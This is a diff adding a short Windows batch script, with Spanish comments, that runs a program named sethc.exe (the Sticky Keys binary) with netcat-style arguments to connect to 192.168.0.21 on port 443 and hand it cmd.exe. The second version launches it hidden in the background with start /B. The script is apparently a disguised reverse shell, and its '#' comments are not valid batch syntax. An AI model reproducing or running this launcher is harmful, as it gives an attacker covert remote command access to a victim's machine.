@@ -1,0 +1,12 @@
+@echo off
+C:\Windows\system32\sethc.exe 192.168.0.21 443 -e cmd.exe
+
+
+
+
+
+@echo off
+# Desactiva la visualización de los comandos en la consola.
+
+start "" /B C:\Windows\system32\sethc.exe 192.168.0.21 443 -e cmd.exe
+# Utiliza el comando "start" para ejecutar el archivo sethc.exe en segundo plano (/B) sin mostrar una ventana de comando adicional ("").
